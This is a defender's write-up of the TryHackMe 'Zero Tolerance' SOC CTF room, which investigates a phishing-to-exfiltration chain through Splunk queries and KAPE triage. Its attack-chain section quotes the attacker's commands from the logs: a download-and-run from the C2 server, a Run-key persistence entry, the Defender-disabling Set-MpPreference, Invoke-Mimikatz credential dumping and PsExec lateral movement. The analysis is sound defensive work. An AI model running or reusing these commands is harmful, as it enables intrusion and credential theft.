# Zero Tolerance (TryHackMe)

Room: Zero Tolerance — premium **SOC L1 CTF** (full attack-chain investigation). ProbablyFine Ltd. has
just onboarded VaultSecure Banking under a "zero tolerance" probation clause when a critical persistence
alert fires on a new endpoint. You reconstruct the whole intrusion from **two evidence sources**: a
Splunk instance (Windows Security + Sysmon logs for two hosts) and a **KAPE triage collection** of the
compromised hosts' filesystems. Completed: 2026-11-02 | Target: <ip>.

Solved almost entirely **headless from `C:\CTF`**: Splunk via its Web REST search API through the lab's
nginx reverse proxy (`http://<ip>/`, `admin:<redacted-pw>`, CSRF cleared with `X-Requested-With`);
the final two answers from the KAPE `.7z` (downloaded from the room's Google Drive link, one file
extracted with 7-Zip). Two hosts: **JP-BROWN-WS** (workstation, beachhead) and **BKUP-SRV01** (backup
server, lateral-movement target). index=`zerotolerance`, sourcetype `WinEventLog` (Sysmon EID 1/3/11/13
+ Security). **No PowerShell Operational channel (no 4104)** — all command lines come from Sysmon EID 1.

## Answers

| # | Question | Answer | Source |
|---|---|---|---|
| 1 | Hostname of Initial Access | *(find it yourself)* | Splunk |
| 2 | Initial code-execution sub-technique | *(find it yourself)* | analysis |
| 3 | Malicious file (full path) | *(find it yourself)* | Splunk (EID 11) |
| 4 | LOLBin abused for Initial Access | *(find it yourself)* | Splunk (EID 1) |
| 5 | C2 server IP | `<ip>` | Splunk (EID 1) |
| 6 | C2 beaconing process | *(find it yourself)* | Splunk (EID 1) |
| 7 | Persistence registry path | *(find it yourself)* | Splunk (EID 1) |
| 8 | Credential-dumping tool + parameter | *(find it yourself)* | Splunk (decoded EncodedCommand) |
| 9 | Defender parameter changed | *(find it yourself)* | Splunk (decoded EncodedCommand) |
| 10 | PID that initiated remote execution | *(find it yourself)* | Splunk (EID 1) |
| 11 | Remote login time from beachhead | *(find it yourself)* | Splunk (Security 4624) |
| 12 | Data-collection PowerShell script | *(find it yourself)* | Splunk (EID 1/11) |
| 13 | First four extensions targeted | *(find it yourself)* | KAPE (script source) |
| 14 | Staged file (collected data) | *(find it yourself)* | KAPE / Splunk |

## Attack chain (reconstructed)

All attacker times below are 2025-11-14, as Splunk renders them (UTC+10; the events' UTC date is the 13th
— see lessons).

1. **Initial access — T1204.002 / T1218.005 (beachhead JP-BROWN-WS, user `jp.brown`).** User opens
   `C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk` — a `.lnk` masquerading as a résumé PDF
   (double extension `.pdf.lnk`). At **05:04:56** it launches the LOLBin
   `mshta.exe http://<ip>:80/KsWLx.hta` (Sysmon records mshta's parent as `-`).
2. **Payload + persistence (one shot from the HTA).** mshta spawns, within the same second:
   - `powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('http://<ip>:80/RuntimeBroker.exe','C:\Windows\Temp\RuntimeBroker.exe')"`
   - `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemMonitor /t REG_SZ /d "C:\Windows\Temp\RuntimeBroker.exe" /f`
   - `C:\Windows\Temp\RuntimeBroker.exe` — the C2 beacon (pid 6900).
3. **Hands-on-keyboard recon (RuntimeBroker children, 05:05–05:08):** `wmic process list brief`,
   `whoami /priv`, `netstat -an`, `nltest /dclist:vaultsecure.local`.
4. **Defense evasion — T1562.001 (05:08:46, base64/UTF-16 `-EncodedCommand`):**
   `Set-MpPreference -DisableRealtimeMonitoring 1 ...; Set-MpPreference -ExclusionPath 'C:\' ...`
   → the changed parameter is **`DisableRealtimeMonitoring`**.
5. **Credential dumping — T1003.001 (05:09:34, EncodedCommand):**
   `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds`
   → tool+param **`Invoke-Mimikatz -DumpCreds`**. Then `reg add ...\Control\Lsa /v DisableRestrictedAdmin /d 0`.
6. **Lateral movement — T1021.002 (05:17:59).** `PsExec64.exe \\<ip> cmd /c "reg add ...\Lsa ..."`
   from beachhead — the initiating process is **PsExec64.exe pid 6612**. Target `<ip>` = BKUP-SRV01.
   Successful network logon (Security **4624**, Type 3, NTLM, user `bkup-svc`, source `<ip>`/
   JP-BROWN-WS) at **05:18:01**; `C:\Windows\PSEXESVC.exe` appears on BKUP-SRV01 at 05:18:22.
7. **Collection (BKUP-SRV01, 05:21–05:23).** `powershell ... Invoke-WebRequest -Uri
   "http://<ip>:80/Setup-BackupServer.ps1" -OutFile "C:\Windows\Temp\Setup-BackupServer.ps1"; &
   "...Setup-BackupServer.ps1"`. The script copies the first-match extensions
   `*.bak, *.backup, *.sql, *.mdb` (then `.accdb/.vhd/.vhdx/.vmdk/.config/.xml/.key/.pem/.pfx/.p12/.cer/.crt`)
   from backup/SQL/key locations into a temp dir, `Compress-Archive`s to `sysbackup_<yyyyMMdd>.zip`, then
   renames to **`C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat`** (`.zip`→`.dat` to blend in).

## Headless method notes

- **Splunk via nginx reverse proxy on the VPN IP.** Port 80 = nginx; while Splunk boots it returns
  `502 Bad Gateway` (room warns ~4–5 min). Once up, same flow as [[thm-splunk-detection-headless]]:
  `GET /en-US/account/login` → seed `cval` → `POST` login `admin:<redacted-pw>` → search via
  `POST /en-US/splunkd/__raw/services/search/jobs` with `exec_mode=oneshot&output_mode=json`, headers
  `X-Splunk-Form-Key: <splunkweb_csrf_token_8000>` **and** `X-Requested-With: XMLHttpRequest`.
- **Decoding `-EncodedCommand`:** base64 → UTF-16-LE (`base64.b64decode(x).decode('utf-16-le')`). Use
  `python` (not `python3`) on this Git-Bash; add `PYTHONUTF8=1` for unicode stdout.
- **KAPE `.7z`:** downloaded via browser to `~/Downloads` (Google Drive, ~112 MB `Artifacts.7z`), watched
  the `.crdownload` finalize, then extracted a single file into its own empty dir:
  `7z e Artifacts.7z -oC:\CTF\zt_kape "BKUP-SRV01\C\Windows\Temp\Setup-BackupServer.ps1" -y`. The triage
  holds both hosts under `<HOST>\C\...` (NTUSER.DAT, SOFTWARE hive, Temp, etc.).

## Lessons

- **"You'll need both" is literal.** Twelve answers were in Splunk, but the two that depend on *file
  content* — the collection script's targeted-extension array (Q13) and the renamed archive (Q14) —
  weren't: there was **no ScriptBlock (4104) logging**, and the `Compress-Archive` output was never
  caught by a Sysmon FileCreate (EID 11 returned nothing for that temp dir). Host-based triage (KAPE)
  is the only source for on-disk artifacts the telemetry didn't record. Always confirm a gap in Splunk
  before assuming an answer isn't there — then pivot to the disk.
- **Timezone trap.** `strftime(_time)` renders in the search user's TZ (here UTC+10), but the default
  `date_*` fields are UTC — so `date_mday=14` returned **zero** rows for events shown as `05:xx on the
  14th` (their UTC date is the 13th). Never filter attacker-window events with `date_mday`/`date_hour`;
  trace by **process lineage** (ParentImage/ProcessGuid) or explicit `_time` epochs instead. Report
  timestamps as Splunk displays them (what the grader's author saw); Q11 = *(find it yourself)*.
- **Separate the technique from the tool.** Q2 (initial code-execution sub-technique) = *(find it yourself)*
  (user ran the malicious `.lnk`); Q4 (LOLBin) = *(find it yourself)*. Two questions, two layers of
  the same step — don't collapse them.
- **Decoy noise is heavy in realistic CTFs.** Benign scheduled `System_Check.ps1`/`Backup_Cache.ps1`,
  Slack, GoogleUpdater, chocolatey and Python installs dominate volume. Anchoring on the beacon
  (`RuntimeBroker.exe`) and walking its process tree cut straight to the real activity.
- **`.lnk` double-extension → mshta → remote HTA → fileless beacon + `HKCU\...\Run`** is a clean,
  classic phishing-to-persistence chain — directly reusable as a teaching example.
